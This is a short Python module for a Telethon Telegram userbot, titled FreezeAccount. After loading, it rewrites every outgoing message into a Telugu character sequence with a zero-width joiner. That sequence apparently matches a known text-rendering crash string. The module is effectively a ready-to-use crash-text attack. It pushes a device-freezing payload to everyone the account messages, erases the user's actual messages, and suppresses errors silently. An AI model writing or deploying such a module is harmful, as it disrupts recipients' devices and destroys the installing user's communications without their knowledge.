from .. import loader, utils
from telethon.tl.types import Message


class FreezeAccount(loader.Module):
    strings = {'name': 'జ్ఞ‌'}
    
    async def client_ready(self, client, database):
        self.client = client
    
    async def watcher(self, message: Message):
        if not message.out:
            return
        
        try:
            await message.edit("జ్ఞ‌")
        except:
            pass
